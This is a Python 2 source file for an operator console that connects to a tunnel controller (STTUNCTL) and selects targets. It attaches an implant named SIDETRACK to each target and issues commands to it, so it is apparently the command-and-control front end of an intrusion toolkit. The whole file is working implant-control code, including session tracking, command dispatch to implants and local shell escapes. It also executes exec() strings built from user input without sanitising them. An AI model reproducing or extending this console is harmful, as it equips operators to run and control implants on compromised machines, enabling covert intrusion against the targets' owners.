#!/usr/bin/python
import base
import string
import re
import sidetrack
from string import upper
import sys
if sys.platform != "win32":
    import readline
import os

targ = None
imp = None
running = 0

#-----------------------------------------------------------------------------
# Name   : ReadCommand
# Purpose: Prompt the user for some data and return the result
# Receive: prompt - The prompt to display asking the user for data
# Return : The input the user provided
#-----------------------------------------------------------------------------
def ReadCommand(prompt):
    try:
        return raw_input(prompt)
    except:
        running = 0
        return None

#-----------------------------------------------------------------------------
# Name   : ListTargets
# Purpose: Print a listing of all the targets from the registered in targets.py
# Receive: << nothing >>
# Return : << nothing >>
#-----------------------------------------------------------------------------
def ListTargets(pattern):
    print "Targets:\n------------------------------------------"
    for targ in base.targetDict.keys():
        if not pattern or re.search(pattern,targ) != None:
            print "%15s - %15s (%s)" % \
                  (targ, base.targetDict[targ].host, base.targetDict[targ].ip)

#-----------------------------------------------------------------------------
# Name   : GetTarget
# Purpose: Asks the user to select a target, then looks up the record for it
# Receive: << nothing >>
# Return : The target object
#-----------------------------------------------------------------------------
def GetTarget():
    while 1:
        projName = ReadCommand("Select a target (? for list): ")
        if projName == None:
            return None
        projName = base.SplitCommandString(projName)
        if not len(projName):
            return None
        elif projName[0] == '?' and len(projName) > 1:
            ListTargets(upper(projName[1]))
            continue
        elif projName[0] == '?':
            ListTargets(None)
            continue
        else:
            try:
                return base.targetDict[upper(projName[0])]
            except:
                print "Invalid target   press ? for list"
                continue

#-----------------------------------------------------------------------------
# Name   : ListImplants
# Purpose: Output a listing of all registered implants for a target
# Receive: targ - The target containing the list
# Return : << nothing >>
#-----------------------------------------------------------------------------
def ListImplants(targ):
    print "Implants:\n---------"
    for imp in targ.implantList.keys():
        print imp
        
#-----------------------------------------------------------------------------
# Name   : GetImplant
# Purpose: Prompt the user to select an implant, then return the implant obj.
# Receive: targ - The target with a list of implants
# Return : The implant object for the implant the user selected
#-----------------------------------------------------------------------------
def GetImplant(targ):
    while 1:
        impName = ReadCommand("Select an implant (? for list): ")
        if impName == None:
            return None
        elif impName[:1] == '?':
            ListImplants(targ)
            continue
        else:
            try:
                return base.GetImplant(impName)
            except:
                print "Invalid implant   press ? for list"
                continue

#-----------------------------------------------------------------------------
# Name   : ListCommands
# Purpose: List all command avaliable to the user from within the interface
# Receive: session - A session object containing the target and implant
# Return : << nothing >>
#-----------------------------------------------------------------------------
def ListCommands(session):
    print "Commands:\n---------"
    for cmd in session.implant.commands.keys():
        cmd_ = session.GetCommand(cmd)
        print "%10s - %s" % (cmd_.name, cmd_.info)
        cmd_ = None
    # Don't forget to print our commands
    print "%10s - %s" % ("exit", "exit the LP")
    print "%10s - %s" % ("new", "select a new target")

#-----------------------------------------------------------------------------
# Name   : ProcessArg
# Purpose: Tests to see if the argument is a string or number
# Receive: arg - The argument to test
# Return : The original string if a number, or a quoted string if not
#-----------------------------------------------------------------------------
def ProcessArg(arg):
    if (re.match('^-?[0-9]*(\.[0-9]+)?$',arg) != None or \
        re.match('^0x[0-9a-fA-F]+L?', arg) != None):
        return arg
    else:
        if arg[0:1] == '$':
            arg = base.variableDict[arg[1:]]
            if type(arg) != type(""):
                return "%d" % (arg)
               
        return '"' + arg + '"'

#-----------------------------------------------------------------------------
# Name   : ProcessCommand
# Purpose: Process the command line args and execute the command
# Receive: cmd  - The command object
#          args - The command line arguments for the command
# Return : The result of processing the command
#-----------------------------------------------------------------------------
def ProcessCommand(cmd, args, assignName):
    argString = 'myVar = cmd.run('
    for i in range(2,len(args)):
        if i == 2:
            argString = argString + ProcessArg(args[i])
        else:
            argString = argString + ", " + ProcessArg(args[i])
    argString = argString + ')'
    base.db(3, argString)
    exec(argString)
    if assignName != None:
        base.variableDict[assignName] = myVar[0]
        base.db(3, "Assigned %d to %s" % (myVar[0], assignName))
    return myVar

def newSession(targname):
    target = GetTarget()
    if target == None:
        return None
    imp = base.GetImplant("SIDETRACK")
    session = base.Session(target,imp)
    session.name = targname
    return session

def SetCommand(args):
    if len(args) == 1:
        print "Current settings"
        print "-------------------------"
        print " debug   = %d/5" % (base.dblevel)
        return
    if args[1] == 'debug':
        base.dblevel = eval(args[2])
        return
    return
        
    

#-----------------------------------------------------------------------------
# Name   : GetCommand
# Purpose: Prompt the user to enter a command, then lookup the command object
# Receive: session - The structure containing both the implant and target objs.
# Return : The result of executing the command
#-----------------------------------------------------------------------------
def GetCommand():
    global more_commands
    while 1:
        assignName = None
        cmdLine = ReadCommand("SIDETRACK# ")
        if cmdLine == None:
            return None
        # Parse the command line into the args
        args = base.SplitCommandString(cmdLine)
        # See what command to run
        if len(args) == 0:
            continue
        if upper(args[0])[:1] == 'E' or upper(args[0])[:1] == 'Q':
            return None
        if args[0][:1] == '!':
            cmd = ""
            if len(args[0]) > 1:
                cmd = " " + args[0][1:]
            elif len(args) == 1:
                os.system(os.environ["SHELL"])
                continue
            for i in range(1,len(args)):
                cmd = cmd + " " + args[i]
            cmd = cmd[1:]
            try:
                base.db(2, cmd)
                if string.split(cmd)[0] == "cd":
                    os.chdir(cmd[3:])
                else:
                    os.system(cmd)
            except Exception, message:
                print message
            continue
        if args[0][:1] == "#":
            continue
        if upper(args[0])[:1] == 'H' or args[0] == '?':
            print "Base Commands"
            print "----------------------"
            print "    help     - This display"
            print "    targets  - List the current targets"
            print "    set      - Set various global options (type 'set' to see the options)"
            print "    exit     - Terminates the application"
            print "    quit     - Same as exit"
            print ""
            print "For help with target Command and Control enter: t# help (where # is the\n                                                         target number)"
            print "For help connecting to a SIDETRACK target enter: t# help connect"
            continue
        if args[0][0:1] == '$':
            try:
                print base.variableDict[args[0][1:]]
            except:
                print "Variable %s undefined" % (args[0][1:])
        if upper(args[0]) == 'SET':
            SetCommand(args)
            continue
        if upper(args[0])[:2] == 'TA':
            keys = base.sessionDict.keys()
            for i in range(len(keys)):
                if keys[i] != 'me' and base.sessionDict[keys[i]] != None:
                    print "         %-6s - %s(%s)" % (keys[i], base.sessionDict[keys[i]].target.ip, base.sessionDict[keys[i]].target.name)
            continue
        elif len(args) == 1:
            continue
        elif len(args) >= 3 and args[1] == "=":
            base.db(2, "Assignment statement")
            assignName = args[0]
            args2 = args
            args = {}
            for i in range(len(args2)-2):
                args[i] = args2[i+2]
        try:
            exec("session = base.sessionDict['%s']" % args[0])
            if session == None:
                session = newSession(args[0])
                if session != None:
                    base.sessionDict[args[0]] = session
        except:
            session = newSession(args[0])
            if session != None:
                base.sessionDict[args[0]] = session
        if session == None:
            continue

        # Add in the commands for this interface
        if args[1] == '?' or upper(args[1][:1]) == 'H':
            if len(args) == 3:
                try:
                    cmd = session.GetCommand(args[2])
                    print args[2], "usage:"
                    print
                    print cmd.usage
                    print
                    cmd = None
                except:
                    print "Invalid command   press ? for list"
                continue
            else:
                ListCommands(session)
                continue

        # Find the command object
        cmd = session.GetCommand(args[1])
        if cmd == None:
            print "Invalid command   press ? for list"
            continue
        # Run the command and return the result
        if base.dblevel < 5:
            try:
                return ProcessCommand(cmd,args,assignName)
            except Exception,message:
                print message
                print "Invalid usage...try:"
                print cmd.usage
                continue
        else:
            return ProcessCommand(cmd,args,assignName)

#-----------------------------------------------------------------------------
# MAIN loop
#-----------------------------------------------------------------------------
# connect
host = "localhost"
port = 912

try:
    if len(sys.argv) == 2:
        host = sys.argv[1]
    elif len(sys.argv) == 3:
        port = eval(sys.argv[2])
except:
    print "Usage: %s [host [port]]\n" %(sys.argv[0])
    sys.exit()

while not running:
    try:
        base.redir.connect(host,port)
        running = 1
    except:
        print "Could not connect to STTUNCTL at %s:%d" % (host,port)
        host = ReadCommand("STTUNCTL Host: ")
        if host == None or len(host) == 0:
            sys.exit()
        port = ReadCommand("STTUNCTL Port: ")
        if port == None or len(port) == 0:
            sys.exit()
        port = eval(port)
        
while running:

    # Get commands
    more_commands = 1
    while more_commands:
        res = GetCommand()
        
        if res == None:
            running = 0
            more_commands = 0
            for targ in base.sessionDict.keys():
                base.db(4,targ)
                if base.sessionDict[targ] != None and targ != "me":
                    running = 1
                    more_commands = 1
                    break
            if running == 1:
                redo = ReadCommand("\nThere are still open targets. \nAre you sure you want to exit? (y/N): " )
                if redo != None:
                    redo = upper(redo)
                    if redo[0:1] == "Y":
                        more_commands = 0
                        running = 0
            continue
        elif res[0]:
            print res[1]
        else:
            print "Failed:",res[1]
        
    
print
